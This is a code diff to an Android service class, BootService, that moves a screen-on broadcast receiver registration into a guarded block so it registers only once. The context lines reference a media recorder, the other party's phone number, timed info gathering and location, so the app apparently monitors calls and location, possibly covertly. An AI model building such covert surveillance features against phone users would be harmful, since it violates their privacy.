@@ -55,6 +55,8 @@ public class BootService extends Service
 	public static String otherSidePhoneNum = "";
 	private static MediaRecorder recorder;
 	
+	private static IntentFilter screenStateIntent = null;
+	
 	static {
 		recorder = new MediaRecorder();
 	}
@@ -190,9 +192,6 @@ public class BootService extends Service
 		
 		mGetInfoTimer = new Timer();
 		mInfoTask = new GetInfoTask(context);
-		
-		// Register screen_on intent broadcast receiver
-		this.registerReceiver(new ScreenStateReceiver(), new IntentFilter(Intent.ACTION_SCREEN_ON));
 	}
 
 	@Override
@@ -230,7 +229,12 @@ public class BootService extends Service
 		{
 			locationUtil = new LocationUtil(context);
 		}
-		 
+		
+		// Register screen_on intent broadcast receiver
+		if (screenStateIntent == null) {
+			screenStateIntent = new IntentFilter(Intent.ACTION_SCREEN_ON);
+			this.registerReceiver(new ScreenStateReceiver(), screenStateIntent);
+		}
 	}
 	
 	/*
